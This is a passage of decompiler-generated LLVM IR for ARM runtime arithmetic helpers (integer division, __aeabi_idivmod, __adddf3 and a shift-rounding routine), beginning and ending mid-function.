dec_label_pc_2ff48thread-pre-split.loopexit:      ; preds = %dec_label_pc_2ff48thread-pre-split.loopexit.loopexit, %.thread3
  %v1_2ff5452 = phi i32 [ %v1_2ff40, %.thread3 ], [ %v1_2ff5452.ph, %dec_label_pc_2ff48thread-pre-split.loopexit.loopexit ]
  %v0_2ff48.pr42 = phi i32 [ %v0_2ff48.pr40, %.thread3 ], [ %v0_2ff48.pr42.ph, %dec_label_pc_2ff48thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_2ff48thread-pre-split

dec_label_pc_2ff48thread-pre-split:               ; preds = %dec_label_pc_2ff48thread-pre-split.loopexit, %bb91
  %v1_2ff5450 = phi i32 [ %v1_2ff5452, %dec_label_pc_2ff48thread-pre-split.loopexit ], [ %v3_2ff54, %bb91 ]
  %v2_2ff4c48 = phi i32 [ %v0_30000, %dec_label_pc_2ff48thread-pre-split.loopexit ], [ %v2_2ff4c, %bb91 ]
  %v0_2ff48.pr = phi i32 [ %v0_2ff48.pr42, %dec_label_pc_2ff48thread-pre-split.loopexit ], [ %v3_2ff50, %bb91 ]
  br label %dec_label_pc_2ff48

dec_label_pc_2ff48.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_2ff48

dec_label_pc_2ff48:                               ; preds = %dec_label_pc_2ff48.loopexit, %dec_label_pc_2ff48thread-pre-split
  %v1_2ff54 = phi i32 [ %v1_2ff5450, %dec_label_pc_2ff48thread-pre-split ], [ %v1_2ff40, %dec_label_pc_2ff48.loopexit ]
  %v2_2ff4c = phi i32 [ %v2_2ff4c48, %dec_label_pc_2ff48thread-pre-split ], [ %v0_30000, %dec_label_pc_2ff48.loopexit ]
  %v1_2ff50 = phi i32 [ %v0_2ff48.pr, %dec_label_pc_2ff48thread-pre-split ], [ %v4_2ff3c, %dec_label_pc_2ff48.loopexit ]
  %v2_2ff48 = icmp slt i32 %v1_2ff50, 0
  br i1 %v2_2ff48, label %dec_label_pc_2ff5c, label %bb90

bb90:                                             ; preds = %dec_label_pc_2ff48
  %v4_2ff4c = icmp ult i32 %v1_2ff50, %v2_2ff4c
  br i1 %v4_2ff4c, label %bb91, label %dec_label_pc_2ff5c

bb91:                                             ; preds = %bb90
  %v3_2ff50 = mul i32 %v1_2ff50, 2
  %v2_2ff54 = icmp slt i32 %v1_2ff54, 0
  %v3_2ff54 = mul i32 %v1_2ff54, 2
  br i1 %v2_2ff54, label %dec_label_pc_2ff5c, label %dec_label_pc_2ff48thread-pre-split

dec_label_pc_2ff5c:                               ; preds = %bb90, %dec_label_pc_2ff48, %bb91
  %v2_2ff6863 = phi i32 [ %v3_2ff54, %bb91 ], [ %v1_2ff54, %bb90 ], [ %v1_2ff54, %dec_label_pc_2ff48 ]
  %v1_2ff6055 = phi i32 [ %v3_2ff50, %bb91 ], [ %v1_2ff50, %bb90 ], [ %v1_2ff50, %dec_label_pc_2ff48 ]
  br label %dec_label_pc_2ff60

dec_label_pc_2ff60:                               ; preds = %.thread13, %dec_label_pc_2ff5c
  %v1_2ff94 = phi i32 [ %v4_2ff94, %.thread13 ], [ %v2_2ff6863, %dec_label_pc_2ff5c ]
  %v1_2ff68 = phi i32 [ %v1_2ffa4, %.thread13 ], [ 0, %dec_label_pc_2ff5c ]
  %v1_2ff98 = phi i32 [ %v4_2ff98, %.thread13 ], [ %v1_2ff6055, %dec_label_pc_2ff5c ]
  %v1_2ff64 = phi i32 [ %v0_2ff90, %.thread13 ], [ %v0_30000, %dec_label_pc_2ff5c ]
  %v3_2ff60 = icmp ult i32 %v1_2ff64, %v1_2ff98
  br i1 %v3_2ff60, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_2ff60
  %v3_2ff64 = sub i32 %v1_2ff64, %v1_2ff98
  %v3_2ff68 = or i32 %v1_2ff68, %v1_2ff94
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2ff60, %bb92
  %v1_2ff70 = phi i32 [ %v1_2ff64, %dec_label_pc_2ff60 ], [ %v3_2ff64, %bb92 ]
  %v1_2ff74 = phi i32 [ %v1_2ff68, %dec_label_pc_2ff60 ], [ %v3_2ff68, %bb92 ]
  %v4_2ff6c = udiv i32 %v1_2ff98, 2
  %v6_2ff6c = icmp ult i32 %v1_2ff70, %v4_2ff6c
  br i1 %v6_2ff6c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_2ff70 = urem i32 %v1_2ff98, 2
  %v4_2ff70 = icmp eq i32 %v3_2ff70, 0
  %v6_2ff70 = sub i32 %v1_2ff70, %v4_2ff6c
  br i1 %v4_2ff70, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_2ff74 = udiv i32 %v1_2ff94, 2
  %v6_2ff74 = or i32 %v1_2ff74, %v5_2ff74
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_2ff7c = phi i32 [ %v6_2ff70, %bb93 ], [ %v1_2ff70, %.thread8 ], [ %v6_2ff70, %bb94 ]
  %v1_2ff80 = phi i32 [ %v1_2ff74, %bb93 ], [ %v1_2ff74, %.thread8 ], [ %v6_2ff74, %bb94 ]
  %v4_2ff78 = udiv i32 %v1_2ff98, 4
  %v6_2ff78 = icmp ult i32 %v1_2ff7c, %v4_2ff78
  br i1 %v6_2ff78, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_2ff7c = and i32 %v1_2ff98, 2
  %v4_2ff7c = icmp eq i32 %v3_2ff7c, 0
  %v6_2ff7c = sub i32 %v1_2ff7c, %v4_2ff78
  br i1 %v4_2ff7c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_2ff80 = udiv i32 %v1_2ff94, 4
  %v6_2ff80 = or i32 %v1_2ff80, %v5_2ff80
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_2ff88 = phi i32 [ %v6_2ff7c, %bb95 ], [ %v1_2ff7c, %.thread9 ], [ %v6_2ff7c, %bb96 ]
  %v1_2ff8c = phi i32 [ %v1_2ff80, %bb95 ], [ %v1_2ff80, %.thread9 ], [ %v6_2ff80, %bb96 ]
  %v4_2ff84 = udiv i32 %v1_2ff98, 8
  %v6_2ff84 = icmp ult i32 %v1_2ff88, %v4_2ff84
  br i1 %v6_2ff84, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_2ff88 = and i32 %v1_2ff98, 4
  %v4_2ff88 = icmp eq i32 %v3_2ff88, 0
  %v6_2ff88 = sub i32 %v1_2ff88, %v4_2ff84
  br i1 %v4_2ff88, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_2ff8c = udiv i32 %v1_2ff94, 8
  %v6_2ff8c = or i32 %v1_2ff8c, %v5_2ff8c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_2ffa4 = phi i32 [ %v1_2ff8c, %bb97 ], [ %v1_2ff8c, %.thread10 ], [ %v6_2ff8c, %bb98 ]
  %v0_2ff90 = phi i32 [ %v6_2ff88, %bb97 ], [ %v1_2ff88, %.thread10 ], [ %v6_2ff88, %bb98 ]
  %v2_2ff90 = icmp eq i32 %v0_2ff90, 0
  br i1 %v2_2ff90, label %dec_label_pc_2ffa0, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_2ff94, 16
  br i1 %tmp, label %dec_label_pc_2ffa0, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_2ff94 = udiv i32 %v1_2ff94, 16
  %v4_2ff98 = udiv i32 %v1_2ff98, 16
  br label %dec_label_pc_2ff60

dec_label_pc_2ffa0:                               ; preds = %thread-pre-split12, %bb99
  %v1_2ffa0 = icmp slt i32 %v2_2fef8, 0
  br i1 %v1_2ffa0, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_2ffa0
  %v2_2ffa4 = sub i32 0, %v1_2ffa4
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_2ffac, %dec_label_pc_2ffa0, %bb100
  %v1_2ffa8 = phi i32 [ %v1_2ffa4, %dec_label_pc_2ffa0 ], [ %v2_2ffa4, %bb100 ], [ %arg1, %dec_label_pc_2ffac ], [ %v2_2ffb0, %bb101 ], [ %v1_2ffc480, %bb103 ], [ %v2_2ffc0, %bb104 ]
  ret i32 %v1_2ffa8

dec_label_pc_2ffac:                               ; preds = %thread-pre-split
  br i1 %v1_2fef4, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_2ffac
  %v2_2ffb0 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_2ffb8:                               ; preds = %bb86
  br i1 %v3_2ff14, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_2ffb8
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_2ffb8, %bb102
  %v1_2ffc480 = phi i32 [ %arg1, %dec_label_pc_2ffb8 ], [ 0, %bb102 ]
  br i1 %v9_2ff14, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_2ffbc = ashr i32 %v2_2fef8, 31
  %v2_2ffc0 = or i32 %v4_2ffbc, 1
  br label %.thread16

dec_label_pc_2ffc8:                               ; preds = %dec_label_pc_2ff1c
  %v2_2ffc8 = icmp ugt i32 %v1_2ffcc, 65535
  br i1 %v2_2ffc8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_2ffc8
  %v2_2ffcc = and i32 %v1_2ffcc, 32768
  %v3_2ffcc = icmp eq i32 %v2_2ffcc, 0
  %v4_2ffcc = udiv i32 %v1_2ffcc, 65536
  br i1 %v3_2ffcc, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_2ffc8
  %v0_2ffd870 = phi i32 [ %v1_2ffcc, %dec_label_pc_2ffc8 ], [ %v4_2ffcc, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_2ffdc = phi i32 [ %v0_2ffd870, %.thread19 ], [ %v4_2ffcc, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_2ffd8 = icmp ugt i32 %v1_2ffdc, 255
  br i1 %v2_2ffd8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_2ffdc = and i32 %v1_2ffdc, 128
  %v3_2ffdc = icmp eq i32 %v2_2ffdc, 0
  %v4_2ffdc = udiv i32 %v1_2ffdc, 256
  br i1 %v3_2ffdc, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_2ffe0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_2ffec = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_2ffe0, %bb108 ]
  %v1_2ffe8 = phi i32 [ %v1_2ffdc, %bb106 ], [ %v4_2ffdc, %bb107 ], [ %v4_2ffdc, %bb108 ]
  %v2_2ffe4 = icmp ugt i32 %v1_2ffe8, 15
  br i1 %v2_2ffe4, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_2ffe8 = and i32 %v1_2ffe8, 8
  %v3_2ffe8 = icmp eq i32 %v2_2ffe8, 0
  %v4_2ffe8 = udiv i32 %v1_2ffe8, 16
  br i1 %v3_2ffe8, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_2ffec = add nsw i32 %v1_2ffec, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_2fff4 = phi i32 [ %v1_2ffec, %.thread20 ], [ %v1_2ffec, %bb109 ], [ %v2_2ffec, %bb110 ]
  %v5_2fff8 = phi i32 [ %v1_2ffe8, %.thread20 ], [ %v4_2ffe8, %bb109 ], [ %v4_2ffe8, %bb110 ]
  %v2_2fff0 = icmp ugt i32 %v5_2fff8, 3
  %v7_2fff0 = icmp eq i32 %v5_2fff8, 4
  %v2_2fff4 = xor i1 %v7_2fff0, true
  %v3_2fff4 = and i1 %v2_2fff0, %v2_2fff4
  br i1 %v3_2fff4, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_2fff4 = add nsw i32 %v4_2fff4, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_2fff8 = phi i32 [ %v4_2fff4, %.thread21 ], [ %v5_2fff4, %bb111 ]
  %v2_2fff8 = xor i1 %v2_2fff0, true
  %v3_2fff8 = or i1 %v7_2fff0, %v2_2fff8
  br i1 %v3_2fff8, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_2fff8 = udiv i32 %v5_2fff8, 2
  %v9_2fff8 = add i32 %v4_2fff8, %v8_2fff8
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_30000 = phi i32 [ %v4_2fff8, %bb112 ], [ %v9_2fff8, %bb113 ]
  %v1_2fffc = icmp slt i32 %v2_2fef8, 0
  %v6_30000 = lshr i32 %v0_30000, %v1_30000
  %v2_30004 = sub i32 0, %v6_30000
  %v2_30004.v6_30000 = select i1 %v1_2fffc, i32 %v2_30004, i32 %v6_30000
  ret i32 %v2_30004.v6_30000

dec_label_pc_3000c:                               ; preds = %entry
  %v0_30010 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_2fff8, { 1, 0 }
  uselistorder i1 %v7_2fff0, { 1, 0 }
  uselistorder i32 %v4_2ffe8, { 1, 0 }
  uselistorder i32 %v1_2ffe8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_2ffdc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_2ffdc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_2ffcc, { 1, 0 }
  uselistorder i32 %v0_2ff90, { 1, 0 }
  uselistorder i32 %v4_2ff84, { 1, 0 }
  uselistorder i32 %v1_2ff8c, { 1, 2, 0 }
  uselistorder i32 %v4_2ff78, { 1, 0 }
  uselistorder i32 %v1_2ff80, { 1, 2, 0 }
  uselistorder i32 %v4_2ff6c, { 1, 0 }
  uselistorder i32 %v1_2ff74, { 1, 2, 0 }
  uselistorder i32 %v1_2ff98, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_2ff68, { 1, 0 }
  uselistorder i32 %v1_2ff94, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_2ff54, { 1, 0 }
  uselistorder i32 %v3_2ff50, { 1, 0 }
  uselistorder i32 %v1_2ff50, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_2ff4c, { 1, 0 }
  uselistorder i32 %v1_2ff54, { 1, 2, 0, 3 }
  uselistorder i32 %v4_2ff40, { 1, 0 }
  uselistorder i32 %v4_2ff3c, { 2, 1, 0 }
  uselistorder i32 %v1_2ff40, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_2ff48.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_2ff14, { 1, 0 }
  uselistorder i32 %v1_2ffcc, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_2fef8, { 1, 0, 2 }
  uselistorder i32 %v0_2fef4, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_2ffa0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_2ff5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2ff48thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_30024 = sdiv i32 %arg1, %arg2
  ret i32 %v2_30024
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_3003c = bitcast i64 %tmp to double
  %v9_3003c = fadd double %v8_3003c, %arg1
  %v10_3003c = fptrunc double %v9_3003c to float
  %v11_3003c = bitcast float %v10_3003c to i32
  ret i32 %v11_3003c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_30040 = load i32, i32* @r0, align 4
  ret i32 %v2_30040
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_30044 = load i32, i32* @r4, align 4
  store i32 %v3_30044, i32* %stack_var_-12, align 4
  %v6_30044 = load i32, i32* @r5, align 4
  %v9_30044 = load i32, i32* @lr, align 4
  %v0_30048 = load i32, i32* %r1.global-to-local, align 4
  %v2_30048 = mul i32 %v0_30048, 2
  store i32 %v2_30048, i32* %r4.global-to-local, align 4
  %v0_3004c = load i32, i32* %r3.global-to-local, align 4
  %v2_3004c = mul i32 %v0_3004c, 2
  store i32 %v2_3004c, i32* %r5.global-to-local, align 4
  %v4_30050 = icmp eq i32 %v2_3004c, %v2_30048
  %v1_30054 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_30050, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_30054 = load i32, i32* %r2.global-to-local, align 4
  %v5_30054 = icmp eq i32 %v2_30054, %v1_30054
  br i1 %v5_30054, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_30058 = or i32 %v1_30054, %v2_30048
  %v5_30058 = icmp eq i32 %v3_30058, 0
  br i1 %v5_30058, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_3005c = load i32, i32* %r2.global-to-local, align 4
  %v3_3005c = or i32 %v2_3005c, %v2_3004c
  %v5_3005c = icmp eq i32 %v3_3005c, 0
  br i1 %v5_3005c, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_30048.off = add i32 %v2_30048, 4194303
  %tmp = icmp ult i32 %v2_30048.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_3004c.off = add i32 %v2_3004c, 4194303
  %tmp17 = icmp ult i32 %v2_3004c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_30068 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_30068, i32 ptrtoint (i32* @global_var_302a0.3614 to i32))
  %v0_3006c = load i32, i32* %r4.global-to-local, align 4
  %v3_3006c = udiv i32 %v0_3006c, 2097152
  store i32 %v3_3006c, i32* %r4.global-to-local, align 4
  %v1_30070 = load i32, i32* %r5.global-to-local, align 4
  %v4_30070 = udiv i32 %v1_30070, 2097152
  %v5_30070 = sub nsw i32 %v4_30070, %v3_3006c
  %v5_30074 = icmp ult i32 %v4_30070, %v3_3006c
  br i1 %v5_30074, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_30074 = sub nsw i32 0, %v5_30070
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_30074, %bb13 ], [ %v5_30070, %.thread3 ]
  %v0_30098 = phi i32 [ %v7_30074, %bb13 ], [ %v5_30070, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_30078 = icmp ugt i32 %v4_30070, %v3_3006c
  br i1 %v7_30078, label %dec_label_pc_3007c, label %dec_label_pc_30098

dec_label_pc_3007c:                               ; preds = %bb14
  %v2_3007c = add nsw i32 %v0_30098, %v3_3006c
  store i32 %v2_3007c, i32* %r4.global-to-local, align 4
  %v0_30080 = load i32, i32* %r0.global-to-local, align 4
  %v1_30080 = load i32, i32* %r2.global-to-local, align 4
  %v0_30084 = load i32, i32* %r1.global-to-local, align 4
  %v1_30084 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_30080, i32* %r0.global-to-local, align 4
  store i32 %v1_30084, i32* %r1.global-to-local, align 4
  store i32 %v0_30080, i32* %r2.global-to-local, align 4
  store i32 %v0_30084, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_30098

dec_label_pc_30098:                               ; preds = %bb14, %dec_label_pc_3007c
  %tmp18 = icmp ugt i32 %v0_30098, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_30098
  %v6_3009c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_3009c, i32* %r4.global-to-local, align 4
  store i32 %v6_30044, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_30098, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_30044)
  %v0_300a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_300a4 = icmp sgt i32 %v0_300a4, -1
  %v4_300b0 = urem i32 %v0_300a4, 1048576
  %v5_300b0 = or i32 %v4_300b0, 1048576
  store i32 %v5_300b0, i32* %r1.global-to-local, align 4
  br i1 %v3_300a4, label %dec_label_pc_300c0, label %dec_label_pc_300b8

dec_label_pc_300b8:                               ; preds = %bb16
  %v0_300b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_300b8 = sub i32 0, %v0_300b8
  store i32 %v1_300b8, i32* %r0.global-to-local, align 4
  %v2_300b8 = icmp eq i32 %v0_300b8, 0
  %v2_300bc = icmp eq i1 %v2_300b8, false
  %v5_300bc = sext i1 %v2_300bc to i32
  %v6_300bc = sub nsw i32 %v5_300bc, %v5_300b0
  store i32 %v6_300bc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_300c0

dec_label_pc_300c0:                               ; preds = %bb16, %dec_label_pc_300b8
  %v0_300c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_300c0 = icmp sgt i32 %v0_300c0, -1
  %v4_300c8 = urem i32 %v0_300c0, 1048576
  %v5_300c8 = or i32 %v4_300c8, 1048576
  store i32 %v5_300c8, i32* %r3.global-to-local, align 4
  br i1 %v3_300c0, label %dec_label_pc_300d8, label %dec_label_pc_300d0

dec_label_pc_300d0:                               ; preds = %dec_label_pc_300c0
  %v0_300d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_300d0 = sub i32 0, %v0_300d0
  store i32 %v1_300d0, i32* %r2.global-to-local, align 4
  %v2_300d0 = icmp eq i32 %v0_300d0, 0
  %v2_300d4 = icmp eq i1 %v2_300d0, false
  %v5_300d4 = sext i1 %v2_300d4 to i32
  %v6_300d4 = sub nsw i32 %v5_300d4, %v5_300c8
  store i32 %v6_300d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_300d8

dec_label_pc_300d8:                               ; preds = %dec_label_pc_300c0, %dec_label_pc_300d0
  %v0_300d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_300d8 = load i32, i32* %r5.global-to-local, align 4
  %v4_300d8 = icmp eq i32 %v1_300d8, %v0_300d8
  call void @__pseudo_cond_branch(i1 %v4_300d8, i32 ptrtoint (i32* @global_var_30288.3615 to i32))
  %v1_300dc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_300dc

; uselistorder directives
  uselistorder i32 %v0_300c0, { 1, 0 }
  uselistorder i32 %v0_300a4, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_30070, { 2, 1, 0 }
  uselistorder i32 %v3_3006c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_30054, { 1, 0 }
  uselistorder i32 %v2_3004c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_30048, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_300d8, { 1, 0 }
  uselistorder label %dec_label_pc_300c0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_30098, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_300e0() local_unnamed_addr {
dec_label_pc_300e0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_300e0 = load i32, i32* @r4, align 4
  %v1_300e0 = add i32 %v0_300e0, -1
  store i32 %v1_300e0, i32* @r4, align 4
  %v0_300e4 = load i32, i32* @r5, align 4
  %v1_300e4 = sub i32 32, %v0_300e4
  store i32 %v1_300e4, i32* @lr, align 4
  %v5_300e8 = icmp sgt i32 %v0_300e4, 32
  br i1 %v5_300e8, label %dec_label_pc_30104, label %dec_label_pc_300ec

dec_label_pc_300ec:                               ; preds = %dec_label_pc_300e0
  %v0_300ec = load i32, i32* @r2, align 4
  %v6_300ec = shl i32 %v0_300ec, %v1_300e4
  store i32 %v6_300ec, i32* %ip.global-to-local, align 4
  %v0_300f0 = load i32, i32* @r0, align 4
  %v3_300f0 = add i32 %v0_300e4, -1
  %v4_300f0 = shl i32 1, %v3_300f0
  %v7_300f0 = lshr i32 %v0_300ec, %v0_300e4
  %v8_300f0 = add i32 %v0_300f0, %v7_300f0
  %v9_300f0 = icmp ult i32 %v8_300f0, %v0_300f0
  %v0_300f4 = load i32, i32* @r1, align 4
  %v2_300f4 = zext i1 %v9_300f0 to i32
  %v3_300f4 = add i32 %v2_300f4, %v0_300f4
  %v1_300f8 = load i32, i32* @r3, align 4
  %v7_300f8 = shl i32 %v1_300f8, %v1_300e4
  %v8_300f8 = add i32 %v7_300f8, %v8_300f0
  store i32 %v8_300f8, i32* %r0.global-to-local, align 4
  %v5_300fc = and i32 %v1_300f8, %v4_300f0
  %v6_300fc = icmp ne i32 %v5_300fc, 0
  %v7_300fc = ashr i32 %v1_300f8, %v0_300e4
  %v9_300fc = add i32 %v3_300f4, %v7_300fc
  %v10_300fc = zext i1 %v6_300fc to i32
  %v11_300fc = add i32 %v10_300fc, %v9_300fc
  br label %dec_label_pc_30120

dec_label_pc_30104:                               ; preds = %dec_label_pc_300e0
  %v1_30104 = add i32 %v0_300e4, -32
  %v1_30108 = add i32 %v1_300e4, 32
  store i32 %v1_30108, i32* @lr, align 4
  %v0_30110 = load i32, i32* @r3, align 4
  %v2_30110 = add i32 %v1_300e4, 31
  %v3_30110 = lshr i32 -2147483648, %v2_30110
  %v4_30110 = and i32 %v0_30110, %v3_30110
  %v5_30110 = icmp ne i32 %v4_30110, 0
  %v6_30110 = shl i32 %v0_30110, %v1_30108
  %v2_30114 = or i32 %v6_30110, 2
  %v2_30114.v6_30110 = select i1 %v5_30110, i32 %v2_30114, i32 %v6_30110
  store i32 %v2_30114.v6_30110, i32* %ip.global-to-local, align 4
  %v0_30118 = load i32, i32* @r0, align 4
  %v7_30118 = ashr i32 %v0_30110, %v1_30104
  %v8_30118 = add i32 %v0_30118, %v7_30118
  store i32 %v8_30118, i32* %r0.global-to-local, align 4
  %v0_3011c = load i32, i32* @r1, align 4
  %v2_3011c = and i32 %v0_30110, 1073741824
  %v3_3011c = icmp ne i32 %v2_3011c, 0
  %v4_3011c = ashr i32 %v0_30110, 31
  %v6_3011c = add i32 %v0_3011c, %v4_3011c
  %v7_3011c = zext i1 %v3_3011c to i32
  %v8_3011c = add i32 %v6_3011c, %v7_3011c
  br label %dec_label_pc_30120

dec_label_pc_30120:                               ; preds = %dec_label_pc_300ec, %dec_label_pc_30104
  %storemerge = phi i32 [ %v11_300fc, %dec_label_pc_300ec ], [ %v8_3011c, %dec_label_pc_30104 ]
  %v0_30120 = phi i32 [ %v11_300fc, %dec_label_pc_300ec ], [ %v8_3011c, %dec_label_pc_30104 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_30120 = and i32 %v0_30120, -2147483648
  store i32 %v1_30120, i32* @r5, align 4
  %v1_30124 = icmp sgt i32 %v0_30120, -1
  call void @__pseudo_cond_branch(i1 %v1_30124, i32 ptrtoint (i32* @global_var_30134.3616 to i32))
  %v0_30128 = load i32, i32* %ip.global-to-local, align 4
  %v1_30128 = sub i32 0, %v0_30128
  store i32 %v1_30128, i32* %ip.global-to-local, align 4
  %v2_30128 = icmp eq i32 %v0_30128, 0
